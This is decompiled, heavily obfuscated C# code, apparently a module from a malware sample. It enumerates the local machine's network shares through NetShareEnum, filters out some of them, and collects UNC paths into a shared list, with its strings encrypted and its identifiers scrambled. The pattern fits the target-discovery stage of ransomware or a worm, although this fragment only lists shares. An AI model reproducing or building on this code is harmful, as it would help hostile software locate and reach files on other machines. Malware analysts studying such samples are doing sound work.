using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public sealed class kPPZhZBfmwQe
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct XqHClniUJlL
	{
		public string LkbpkwnzNCc;

		public uint BVBLbPlRQRSrJ;

		public string JMqGXdxOaI;

		public XqHClniUJlL(string string_0, uint uint_0, string string_1)
		{
			LkbpkwnzNCc = string_0;
			BVBLbPlRQRSrJ = uint_0;
			JMqGXdxOaI = string_1;
		}

		public override string ToString()
		{
			return LkbpkwnzNCc;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public XqHClniUJlL[] tsUcvGeslnherK(string string_0)
	{
		List<XqHClniUJlL> list = new List<XqHClniUJlL>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(XqHClniUJlL));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				XqHClniUJlL item = (XqHClniUJlL)Marshal.PtrToStructure(ptr, typeof(XqHClniUJlL));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new XqHClniUJlL(getString_0(107376561) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void WyfKLYVONPbWN()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			XqHClniUJlL[] array = new kPPZhZBfmwQe().tsUcvGeslnherK(Environment.MachineName);
			XqHClniUJlL[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				XqHClniUJlL xqHClniUJlL = array2[i];
				if (xqHClniUJlL.ToString().Contains(getString_0(107375115)) || xqHClniUJlL.ToString().Contains(getString_0(107375106)) || xqHClniUJlL.ToString().Contains(getString_0(107375129)) || xqHClniUJlL.ToString().Contains(getString_0(107400541)) || logicalDrives.Contains(xqHClniUJlL.ToString().Replace(getString_0(107349666), getString_0(107375088))))
				{
					continue;
				}
				if (!ACJZwXMCdgNnIA.eaZULefnOUcJVI.Contains(getString_0(107400528) + Environment.MachineName + getString_0(107396936) + xqHClniUJlL))
				{
					ACJZwXMCdgNnIA.eaZULefnOUcJVI.Add(getString_0(107400528) + Environment.MachineName + getString_0(107396936) + xqHClniUJlL);
				}
				if (ACJZwXMCdgNnIA.SidumIOOlYmWUm)
				{
					try
					{
						Console.WriteLine(getString_0(107375083), getString_0(107400528) + Environment.MachineName + getString_0(107396936) + xqHClniUJlL);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (ACJZwXMCdgNnIA.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(ACJZwXMCdgNnIA.bDDJFCkjBbYQ, getString_0(107375090) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static kPPZhZBfmwQe()
	{
		Strings.CreateGetStringDelegate(typeof(kPPZhZBfmwQe));
	}
}
